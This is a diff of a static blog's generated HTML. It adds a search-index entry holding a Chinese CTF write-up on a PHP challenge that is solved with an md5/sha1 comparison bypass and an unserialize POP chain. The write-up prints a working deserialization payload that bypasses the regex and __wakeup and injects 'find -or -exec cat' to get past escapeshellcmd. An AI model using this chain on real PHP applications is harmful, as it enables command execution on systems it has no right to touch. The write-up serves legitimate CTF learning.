@@ -9,7 +9,7 @@
 <meta name="description" content="生如逆旅，一苇以航。">
 <meta name="theme-color" content="#000">
 <title>outlaws&#39; blog</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1616406744662">
+<link rel="shortcut icon" href="/favicon.ico?v=1616470373249">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -206,7 +206,7 @@
     <div class="sidebar-item-box">
       <a href="/archives/">
         
-        <span class="site-item-stat-count">3</span>
+        <span class="site-item-stat-count">4</span>
         <span class="site-item-stat-name language" data-lan="article">文章</span>
       </a>
     </div>
@@ -270,6 +270,8 @@
       
       
         
+      
+        
           
             
       
@@ -292,6 +294,8 @@
       <a class="cloud-tag" href="https://outlaws-bai.github.io/tag/UH3enqSU7/" rel="1">web</a>
     
       
+      
+        
       
         
           
@@ -320,6 +324,8 @@
       
       
         
+      
+        
           
         
           
@@ -346,6 +352,8 @@
       <a class="cloud-tag" href="https://outlaws-bai.github.io/tag/d7ThaXMHU/" rel="1">base64</a>
     
       
+      
+        
       
         
           
@@ -378,6 +386,8 @@
       
       
         
+      
+        
           
         
           
@@ -404,6 +414,8 @@
       <a class="cloud-tag" href="https://outlaws-bai.github.io/tag/mGihl_9un/" rel="2">php</a>
     
       
+      
+        
       
         
           
@@ -436,6 +448,8 @@
       
       
         
+      
+        
           
         
           
@@ -466,6 +480,8 @@
       <a class="cloud-tag" href="https://outlaws-bai.github.io/tag/g6GKCnb6O/" rel="2">knowledge-web</a>
     
       
+      
+        
       
         
           
@@ -772,6 +788,124 @@
       <hr>
     </div>
     <div class="result" id="result">
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/ji-yi-dao-fan-xu-lie-hua-andfind-ming-ling-zhi-xing-ti-mu/"" data-c="
+          &lt;p&gt;打开题目&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616470323708.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;part1-md5绕过&#34;&gt;part1 md5绕过&lt;/h1&gt;
+&lt;p&gt;右键查看源码提示有index.php.bak，下载后打开&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    error_reporting(0);
+    $rand_str = &#39;********&#39;;
+    $cookie_data = json_decode($_COOKIE[&#39;data&#39;], true);
+    if ($cookie_data[&#39;data&#39;] == strtolower(md5($rand_str))) {
+        $a = $_POST[&#39;a&#39;];
+        $b = $_POST[&#39;b&#39;];
+        if ($a != $b &amp;amp;&amp;amp; sha1($a) === sha1($b)) {
+            include(&#39;******.php&#39;);
+        }else{
+            &#39;!!&#39;;
+        }
+    }else{
+        echo &#39;!&#39;;
+    } 
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;msup&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;cookie_data[&amp;#x27;data&amp;#x27;] == strtolower(md5(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;rand_str))&lt;/p&gt;
+&lt;p&gt;设置Cookie:data={&amp;quot;data&amp;quot;:1}，爆破1-1000得到data为25时，可使得&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;msup&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;cookie_data[&amp;#x27;data&amp;#x27;] == strtolower(md5(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;rand_str))【为true也可以】&lt;/p&gt;
+&lt;p&gt;$a != &lt;span class=&#39;katex-error&#39; title=&#39;ParseError: KaTeX parse error: Expected &amp;#039;EOF&amp;#039;, got &amp;#039;&amp;amp;&amp;#039; at position 3: b &amp;amp;̲&amp;amp; sha1(&#39;&gt;b &amp;amp;&amp;amp; sha1(&lt;/span&gt;a) === sha1($b)&lt;/p&gt;
+&lt;p&gt;a[]=1&amp;amp;b[]=2绕过即可&lt;/p&gt;
+&lt;h1 id=&#34;part2-反序列化&#34;&gt;part2 反序列化&lt;/h1&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php   
+class getresult{
+    public $obj;
+    public $file;
+
+    function __destruct()
+    {
+        if ($this-&amp;gt;file != &#39;&#39;)
+        {
+            $this-&amp;gt;obj-&amp;gt;execute();
+        }
+        else
+        {
+            die(&#39;fail to getshell!!!&#39;);
+        }
+    }
+
+    function __wakeup()
+    {
+        foreach(get_object_vars($this) as $key =&amp;gt; $value)
+        {
+            $this-&amp;gt;$key = null;
+        }
+        echo &amp;quot;wakeup&amp;quot;;
+    }
+}
+
+class find{
+    private $file;
+    function execute(){
+        system(&amp;quot;find /tmp -iname &amp;quot;.escapeshellcmd($this-&amp;gt;file)); 
+        die(&#39;Success!!!&#39;);
+    }
+}
+if(isset($_GET[&#39;pop&#39;])){
+    $pop = $_GET[&#39;pop&#39;];
+    preg_match(&#39;/[oc]:\d+:/i&#39;, $pop, $result);
+    if(count($result)){
+        die(&#39;no!&#39;);
+    }
+    unserialize($pop);
+}
+
+show_source(__FILE__); 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;1.绕过preg_match(&#39;/[oc]:\d+:/i&#39;, $pop, $result);处正则，只需使得O:+9即可，但要注意+需使用url编码后的%2B，否则会被解析为空格&lt;/p&gt;
+&lt;p&gt;2.绕过__wakeup()  O:9:&amp;quot;getresult&amp;quot;:2:{   将2改为3&lt;/p&gt;
+&lt;p&gt;3.escapeshellcmd()&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;escapeshellcmd()函数对字符串中可能会欺骗shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec()或 system() 函数，或者执行操作符之前进行转义。
+反斜线（\）会在以下字符之前插入： &amp;amp;#;`|*?~&amp;lt;&amp;gt;^()[]{}$\,\x0A 和 \xFF。 &#39; 和 &amp;quot; 仅在不配对儿的时候被转义。 在 Windows平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
+而find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。
+所以可以构造payload为：find /tmp -iname sth -or -exec ls \;
+所以我们的输入为：sth -or -exec ls / ;，这里没有\，是因为上一个函数自动帮你加了\。
+读取flag文件，获取flag。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;构造pop：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php   
+class getresult{
+    public $obj;
+    public $file;
+    function __construct() {
+        $this-&amp;gt;obj = new find();
+        $this-&amp;gt;file = &#39;sth -or -exec cat /f111ag ;&#39;;
+    }
+}
+
+class find{
+    private $file=&#39;sth -or -exec cat /f111ag ;&#39;;
+}
+
+// $f=new find();
+// echo serialize($f)
+$g=new getresult();
+echo urlencode(serialize($g));
+echo serialize($g);
+
+#O%3A%2B9%3A%22getresult%22%3A3%3A%7Bs%3A3%3A%22obj%22%3BO%3A%2B4%3A%22find%22%3A1%3A%7Bs%3A10%3A%22%00find%00file%22%3Bs%3A27%3A%22sth+-or+-exec+cat+%2Ff111ag+%3B%22%3B%7Ds%3A4%3A%22file%22%3Bs%3A27%3A%22sth+-or+-exec+cat+%2Ff111ag+%3B%22%3B%7D
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;即可getflag&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://outlaws-bai.github.io/post-images/1616470360978.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;小结&#34;&gt;小结&lt;/h1&gt;
+&lt;p&gt;find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。&lt;br&gt;
+所以可以构造payload为：find /tmp -iname sth -or -exec ls ;&lt;br&gt;
+所以我们的输入为：sth -or -exec ls / ;，这里没有\，是因为上一个函数自动帮你加了\。&lt;br&gt;
+读取flag文件，获取flag。&lt;/p&gt;
+">记一道反序列化&find命令执行题目</a>
+      </div>
       
       <div class="item">
         <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/LFI_session/"" data-c="
